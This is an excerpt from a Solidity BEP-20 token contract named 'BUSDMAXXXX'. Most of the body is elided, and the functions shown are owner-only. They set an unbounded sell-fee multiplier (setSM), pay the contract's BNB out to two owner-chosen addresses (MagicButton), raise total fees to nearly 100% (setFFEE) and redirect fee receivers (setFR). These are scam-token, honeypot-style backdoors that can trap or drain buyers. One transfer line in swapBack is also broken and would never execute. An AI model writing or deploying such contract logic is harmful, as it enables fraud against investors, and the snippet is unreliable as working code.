...
contract BUSDMAXXXX is IERC20, Ownable {
    ...
    function setSM(uint256 up, uint256 down) external onlyOwner() {
        require(down > 0);
        _sellMultiplierNumerator = up;
        _sellMultiplierDenominator = down;
    }
    ...
    function MagicButton(uint256 aP) external onlyOwner {
        ...
        payable(MAAAReceiver).transfer(amountBNB * aP / 50);
        payable(MAABReceiver).transfer(amountBNB * aP / 50);
    }
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        ...
        if(selling && sellMultiplierEnabled){ return ((totalFee * _sellMultiplierNumerator) / _sellMultiplierDenominator); }
    ...
    function swapBack() internal swapping {
        ...
        (bool tmpSuccess,) = 
        payable(MAAAReceiver).call{value: amountBNBMarketing/2, gas: 30000}("");
        payable(MAABReceiver).call{value: amountBNBMarketing/2, gas: 30000};
    ...
    function setFFEE(uint256 _lF, uint256 _buybackFee, uint256 _rF, uint256 _mF, uint256 _fD) external onlyOwner {
        liquidityFee = _lF;
        reflectionFee = _rF;
        marketingFee = _mF;
        totalFee = _lF.add(_buybackFee).add(_rF).add(_mF);
        feeDenominator = _fD;
        require(totalFee < feeDenominator);
    }

    function setFR(address _LPPPR, address _MAAAR, address _MAABR) external onlyOwner {
        LPPPReceiver = _LPPPR;
        MAAAReceiver = _MAAAR;
        MAABReceiver = _MAABR;
    }
